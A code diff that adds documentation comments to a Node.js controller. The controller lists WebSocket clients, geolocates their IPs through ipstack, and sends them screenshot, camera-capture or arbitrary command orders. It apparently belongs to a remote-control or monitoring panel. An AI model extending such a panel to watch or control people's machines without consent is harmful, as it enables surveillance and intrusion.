@@ -1,23 +1,40 @@
 import {CLIENTS} from "../ws_server.js";
 
+/**
+ * Class representing a controller for clients.
+ */
 class ClientController {
+    /**
+     * Get a list of all clients.
+     * @param {Object} req - The request object.
+     * @param {Object} res - The response object.
+     * @param {Function} next - The next middleware function.
+     * @returns {Object} The response object with the list of clients.
+     */
     async index(req, res, _next) {
+        // Process the CLIENTS data to create an array of client objects with uid, ip, and address properties.
         let processedClients = CLIENTS.map((client) => ({
             uid: client.userId,
             ip: client._socket.remoteAddress,
             address: {}
         }))
 
-        // TODO: add batching of 50 clients to get IPs
+        // Extract the IP addresses from the processed clients.
         const clientIps = processedClients.map((client)=> client.ip)
         if (clientIps.length === 0) {
             return res.json(processedClients)
         }
 
+
         try {
+            // Fetch location based on IP
             const res = await fetch(`http://api.ipstack.com/${clientIps.join(',')}?access_key=${process.env.IPSTACK_API_KEY}`)
             const data = await res.json()
 
+            /**
+             * If the data is an array, iterate over each item and update the corresponding client's address.
+             * If the data is an object, find the corresponding client and update its address.
+             */
             if (Array.isArray(data)) {
                 data.forEach((client) => {
                     let localClient = processedClients.find((c) => c.ip === client.ip)
@@ -42,6 +59,13 @@ class ClientController {
         return res.json(processedClients)
     }
 
+    /**
+     * Send a command to the specified clients.
+     * @param {Object} req - The request object.
+     * @param {Object} res - The response object.
+     * @param {Function} _next - The next middleware function.
+     * @returns {Object} The response object with the status of the command.
+     */
     async sendCommand(req, res, _next) {
         if (!(req.body.type.includes('SCREENSHOT') || req.body.type.includes('CAMERA')) && !req.body.command) {
             res.status(400).send('Bad request')
@@ -53,6 +77,7 @@ class ClientController {
             type: [],
         }
 
+        // Handle the command types
         if (req.body.type.includes('SCREENSHOT')) {
             message.type.push('SCREENSHOT')
         }
@@ -78,4 +103,8 @@ class ClientController {
     }
 }
 
+/**
+ * A new instance of the ClientController class.
+ * @type {ClientController}
+ */
 export default new ClientController();
